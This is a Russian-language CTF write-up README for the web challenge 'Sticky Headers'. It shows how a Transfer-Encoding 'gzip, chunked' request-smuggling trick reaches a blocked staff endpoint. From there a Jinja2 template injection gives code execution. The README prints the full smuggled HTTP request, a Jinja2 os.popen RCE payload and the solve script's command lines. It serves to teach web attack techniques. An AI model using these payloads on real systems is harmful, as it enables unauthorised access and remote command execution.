# Sticky Headers - HTTP request smuggling + Jinja2 SSTI

- **Платформа:** FortiD CTF 2026
- **Категория:** Web
- **Автор:** (не зафиксирован в рабочей папке)
- **Очки / Решили:** (не зафиксированы в рабочей папке)
- **Дата:** 2026-10-13
- **Remote:** `nc <host> 1337` (инстанс выдаёт платформа)
- **Флаг:** `FortID{...}` (замаскирован)
- **Артефакт:** исходников не выдавалось - только живой инстанс

## Что в задаче

Сайт кондитерской с двумя ролями:

- публичный `POST /order` - «заказ» с полем `message`, отвечает `Order received!`;
- внутренний `POST /staff/preview` - рендерит шаблон из поля `message`, но напрямую отдаёт **403**.

Подсказка в задании - *«Older couriers may describe delivery contents using more than one encoding»* - вместе с названием **Sticky Headers** указывает на классический **HTTP request smuggling** через составной `Transfer-Encoding`.

## Решение в двух шагах

**1. Смаглинг.** С заголовками `X-Client-Version: 1` и `Transfer-Encoding: gzip, chunked` на первом запросе `/order` внешний прокси и внутренний сервис по-разному разбирают тело, и в том же соединении обрабатывается **второй** запрос - уже к `/staff/preview` (он возвращает `200`). Рабочий запрос зафиксирован побайтово в `evidence/smuggle_working_070.request` (это тот самый probe #070):

```text
POST /order HTTP/1.1
Host: <host>
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Transfer-Encoding: gzip, chunked

B
order=hello
0

POST /staff/preview HTTP/1.1
Host: <host>
Connection: keep-alive
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

message=%7B%7B7%2A7%7D%7D
```

`B` - это размер чанка 0xB = 11 = длина `order=hello`. Ответ (два HTTP-ответа на одном соединении, второй - страница staff с результатом рендера) лежит рядом в `evidence/smuggle_working_070.response`: `preview">49`.

**2. SSTI - RCE.** Staff-рендерер - Jinja2, `{{7*7}}` даёт `49`. Стандартная цепочка:

```text
{{cycler.__init__.__globals__.os.popen("<CMD>").read()}}
```

`find / -name recipe.txt` находит `/opt/candy/recipe.txt` (симлинк на `/tmp/recipe.txt`), `cat` по этому пути отдаёт флаг.

Полный разбор - в [`solve.md`](solve.md).

## Структура папки

```text
web/sticky-headers/
├── README.md          # это файл: условие задачи
├── solve.md           # решение: разбор, ловушки, флаг
├── scripts/
│   ├── solve.py                  # финальный клиент: смаглинг + SSTI (host [port] / --expr / --cmd)
│   ├── sticky_staff_inspector.py # перебор SSTI-выражений и сбор подтверждений
│   ├── sticky_headers_desync.py  # проверка рассинхрона TE-заголовков
│   └── sticky_headers_v1_probe.py# перебор вариантов X-Client-Version / TE (нашёл #070)
└── evidence/
    ├── smuggle_working_070.request   # рабочий запрос, побайтово
    ├── smuggle_working_070.response  # два ответа, во втором preview=49
    ├── staff_inspector_summary.json  # таблица подтверждённых SSTI-выражений
    ├── staff_inspector_000.request
    └── staff_inspector_000.response
```

## Воспроизведение

Инстанс закрыт после соревнования, поэтому полный прогон вживую сейчас невозможен. Скрипт параметризован и готов к запуску на любом живом инстансе:

```bash
python3 scripts/solve.py <host> 1337        # контроль {{7*7}} -> find -> cat -> флаг
python3 scripts/solve.py <host> --expr '{{7*7}}'
python3 scripts/solve.py <host> --cmd 'id'
```

Проверено офлайн: `build_request(host, '{{7*7}}')` совпадает **байт в байт** с зафиксированным `evidence/smuggle_working_070.request` (456 байт), то есть смаглинговый payload в скрипте - ровно тот, который дал `preview">49` на живом сервере.

Отдельно отмечу: сырой ответ с флагом в папку не попал - его снимали ad-hoc клиентом, а не инспектором, который писал файлы. Флаг в `solve.md` приведён из вывода того запуска; `evidence/` документирует шаг смаглинга и подтверждения SSTI, но не финальный `cat`.